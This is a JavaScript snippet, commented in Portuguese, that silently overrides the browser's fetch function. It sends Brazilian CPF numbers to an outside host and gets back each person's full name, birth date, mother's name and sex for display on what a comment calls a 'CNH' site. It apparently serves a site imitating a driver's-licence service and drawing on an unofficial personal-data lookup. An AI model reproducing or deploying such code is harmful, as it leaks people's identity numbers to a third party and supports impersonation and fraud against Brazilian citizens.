/**
 * CHECKIFY API INTERCEPTOR
 * Intercepta chamadas para /api/cpf-lookup e usa a nova API
 */

(function() {
    'use strict';
    
    // URL da API atualizada
    const PROXY_URL = 'https://base2.sistemafull.site:80/api/cpfx';
    
    // Guarda referência do fetch original
    const originalFetch = window.fetch;
    
    // Função para formatar nome
    function formatarNome(nomeCompleto) {
        if (!nomeCompleto) return '';
        const preposicoes = ['da', 'de', 'do', 'das', 'dos', 'e'];
        const palavras = nomeCompleto.toLowerCase().split(' ');
        return palavras.map((palavra, index) => {
            if (preposicoes.includes(palavra) && index !== 0) {
                return palavra;
            }
            return palavra.charAt(0).toUpperCase() + palavra.slice(1);
        }).join(' ');
    }
    
    // Função para formatar data YYYY-MM-DD para DD/MM/YYYY
    function formatarData(data) {
        if (!data) return '';
        const match = data.match(/(\d{4})-(\d{2})-(\d{2})/);
        if (match) {
            return `${match[3]}/${match[2]}/${match[1]}`;
        }
        return data;
    }
    
    // Substitui o fetch global
    window.fetch = async function(url, options = {}) {
        // Verifica se é uma chamada para a API de CPF
        if (typeof url === 'string' && url.includes('/api/cpf-lookup/')) {
            console.log('[CHECKIFY] Interceptando chamada de CPF:', url);
            
            // Extrai o CPF da URL
            const cpf = url.split('/api/cpf-lookup/')[1]?.split('?')[0]?.replace(/\D/g, '');
            
            if (!cpf || cpf.length !== 11) {
                console.error('[CHECKIFY] CPF inválido:', cpf);
                return new Response(JSON.stringify({ DADOS: null }), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                });
            }
            
            try {
                console.log('[CHECKIFY] Consultando CPF via proxy:', cpf);
                
                // Faz a chamada para a nova API
                const response = await originalFetch(`${PROXY_URL}?CPF=${cpf}`);
                const result = await response.json();
                
                console.log('[CHECKIFY] Resposta do proxy:', result);
                
                // Extrai os dados conforme as novas variáveis: NOME, NASCIMENTO, SEXO, MAE
                const pessoa = result; 
                
                if (pessoa && pessoa.NOME) {
                    // Converte para o formato esperado pelo site CNH
                    const dadosConvertidos = {
                        DADOS: {
                            nome: formatarNome(pessoa.NOME),
                            cpf: cpf,
                            data_nascimento: formatarData(pessoa.NASCIMENTO),
                            nome_mae: formatarNome(pessoa.MAE || ''),
                            sexo: pessoa.SEXO === 'M' ? 'Masculino' : pessoa.SEXO === 'F' ? 'Feminino' : ''
                        }
                    };
                    
                    console.log('[CHECKIFY] Dados convertidos:', dadosConvertidos);
                    
                    return new Response(JSON.stringify(dadosConvertidos), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    });
                } else {
                    console.log('[CHECKIFY] CPF não encontrado');
                    return new Response(JSON.stringify({ DADOS: null }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
            } catch (error) {
                console.error('[CHECKIFY] Erro na requisição:', error);
                return new Response(JSON.stringify({ DADOS: null }), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }
        
        // Para outras chamadas, usa o fetch original
        return originalFetch.apply(this, arguments);
    };
    
    console.log('[CHECKIFY] ✅ Interceptor instalado - usando API:', PROXY_URL);
    
})();